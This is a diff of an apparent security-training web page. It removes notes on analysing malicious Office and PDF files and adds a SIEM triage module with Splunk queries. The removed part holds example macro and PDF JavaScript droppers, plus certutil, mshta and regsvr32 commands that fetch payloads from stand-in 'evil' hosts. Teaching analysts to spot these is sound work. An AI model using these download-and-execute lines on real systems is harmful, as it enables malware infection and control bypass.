@@ -1,54 +1,31 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
-<h6 class="text-danger mb-3"><i class="bi bi-book me-2"></i>Elaborated Notes with Examples</h6>
+<h6 class="text-info mb-3"><i class="bi bi-book me-2"></i>Module 13: SIEM Triage for SOC</h6>
 
-<h6 class="text-danger mt-3">1. OLE / VBA Macros</h3>
-<p>Object Linking and Embedding (OLE) allows Office documents to embed objects. Malicious documents contain VBA (Visual Basic for Applications) macros that execute on open. Auto-execute macros: <code>Document_Open()</code>, <code>AutoOpen()</code>, <code>Workbook_Open()</code>, <code>Auto_Open()</code>. Macros download and execute payloads, manipulate files, and establish persistence.</p>
+<h6 class="text-info mt-3">Sub-Domains / Rooms</h6>
+<ul style="color:#c0d0e0;">
+  <li><b>Log Analysis with SIEM</b> — Query and analyze logs across multiple sources: Windows events, firewall logs, web logs, and endpoint telemetry.</li>
+  <li><b>Alert Triage with Splunk</b> — Use SPL to investigate alerts, build dashboards, and create correlation rules in Splunk.</li>
+  <li><b>Alert Triage with Elastic</b> — Use Kibana and Elasticsearch for log analysis, detection rules, and alert investigation.</li>
+  <li><b>ItsyBitsy</b> — Challenge room: investigate a web attack using SIEM data to identify the attacker and compromised data.</li>
+  <li><b>Benign</b> — Challenge room: distinguish between benign and malicious activity using SIEM correlation.</li>
+  <li><b>Monday Monitor</b> — Challenge room: investigate suspicious activity detected during morning monitoring.</li>
+  <li><b>Friday Overtime</b> — Challenge room: late-night incident investigation using multiple log sources.</li>
+  <li><b>Retracted</b> — Challenge room: analyze a retracted alert that was initially dismissed but needs re-investigation.</li>
+</ul>
+
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example VBA Macro:</b><br>
-<code>Private Sub Document_Open()</code><br>
-<code>&nbsp;&nbsp;Dim obj As Object</code><br>
-<code>&nbsp;&nbsp;Set obj = CreateObject("WScript.Shell")</code><br>
-<code>&nbsp;&nbsp;obj.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4...", 0, False</code><br>
-<code>End Sub</code><br>
-The base64 string decodes to: <code>IEX (New-Object Net.WebClient).DownloadString('http://evil/payload.ps1')</code>. The macro also calls <code>CreateObject("Shell.Application").Namespace(0).ParseName("C:\Windows\System32\wscript.exe").InvokeVerb("runas")</code> to attempt UAC bypass via auto-elevation.
+<b>Example Investigation:</b> The SIEM alerts: "Multiple failed logons followed by successful logon from foreign IP." The analyst queries Splunk:<br>
+<code>index=windows EventID=4625 | stats count by Account_Name, Source_IP</code> — finds 200 failed attempts on admin account from 45.33.32.156.<br>
+<code>index=windows EventID=4624 Account_Name=admin</code> — one successful logon from same IP.<br>
+<code>index=windows EventID=4688 Account_Name=admin</code> — attacker ran cmd.exe, then powershell.exe to download payload.<br>
+Conclusion: RDP brute force succeeded. Analyst isolates server, resets admin password, enables MFA.
 </div>
 
-<h6 class="text-danger mt-3">2. Shell() Invocation</h3>
-<p>VBA's <code>Shell()</code> function is the most common execution method in macros. It runs a command with <code>cmd.exe /c</code>. Analysts look for <code>Shell(</code>, <code>CreateObject("WScript.Shell").Run</code>, and <code>CreateObject("Shell.Application").ShellExecute</code> patterns. Common arguments: PowerShell encoded commands, MSHTA, regsvr32 (SCT), and certutil for download.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example Shell() Variants:</b><br>
-<code>Shell "cmd /c certutil -urlcache -f http://evil.com/msi.dll %TEMP%\msi.dll && rundll32 %TEMP%\msi.dll,Install", vbHide</code><br>
-<code>CreateObject("WScript.Shell").Run "mshta http://evil.com/payload.hta", 0, False</code><br>
-<code>CreateObject("Shell.Application").ShellExecute "regsvr32", "/s /n /u /i:http://evil/file.sct scrobj.dll", "", "runas", 0</code><br>
-Each variant bypasses different controls: certutil for AppLocker, mshta for living-off-the-land, regsvr32 for bypassing script-blocking.
-</div>
-
-<h6 class="text-danger mt-3">3. PDF Analysis (JavaScript)</h3>
-<p>Malicious PDFs use embedded JavaScript for exploitation (HeapSpray, use-after-free) or to open malicious URLs/attachments. Use tools like <code>pdfid.py</code> (counts objects, JS, embedded files), <code>pdf-parser.py</code> (extracts streams), and <code>peepdf</code> (interactive analysis). Look for <code>/JavaScript</code>, <code>/JS</code>, <code>/OpenAction</code>, and <code>/AA</code> entries.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example PDF Analysis:</b> Running <code>pdfid.py invoice.pdf</code> shows:<br>
-<code>PDF Header: %PDF-1.6</code><br>
-<code>obj 45</code><br>
-<code>stream 12</code><br>
-<code>/JS 2</code><br>
-<code>/JavaScript 2</code><br>
-<code>/OpenAction 1</code><br>
-<code>/AA 0</code><br>
-<code>pdf-parser.py -s 10 invoice.pdf</code> extracts a JavaScript stream: <code>app.alert("Document Loading..."); var u = "/malicious.exe"; var c = app.getPath("temp") + "\\temp.exe"; net.HTTP.request({url: u, method: "GET", saveAsPath: c}); app.launchURL("file://" + c);</code>. The PDF opens automatically (OpenAction) and downloads/drops an executable.
-</div>
-
-<h6 class="text-danger mt-3">4. oledump / olevba</h3>
-<p><code>oledump.py</code> analyzes OLE files (Office docs). It lists streams (A1, A2, ... M) with indicators: <code>M</code> = macro, <code>*</code> = interesting. <code>olevba.py</code> (from oletools) extracts and analyzes VBA macros, identifying suspicious patterns like <code>AutoExec</code>, <code>Shell</code>, <code>CreateObject</code>, and <code>HTTP</code> URLs.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example oledump Output:</b><br>
-<code>A: word/vbaProject.bin</code><br>
-<code>M: 5 -> VBA/ThisDocument</code><br>
-<code>M: 6 -> VBA/Module1</code><br>
-<code>M: 7 -> VBA/Module2 (malicious macro)</code><br>
-<code>oledump.py -s 7 -v malicious.docm | Select-String "Shell|CreateObject|http|URL"</code><br>
-Output:<br>
-<code>Call Shell("powershell -e SQBFAFgAIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBjADIALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==", 0)</code><br>
-<code>olevba invoice.docm</code> reports "Suspicious Shell() call found in Module2" with a severity score of 8/10. It detects "Downloads executable from URL" and "Likely malicious VBA macro."
-</div>
-
+<h6 class="text-info mt-3">Key Skills Learned</h6>
+<ul style="color:#c0d0e0;">
+  <li>SIEM query languages (SPL, EQL/KQL)</li>
+  <li>Multi-source log correlation</li>
+  <li>Alert triage methodology</li>
+  <li>Practical challenge room investigations</li>
+</ul>
 </div>
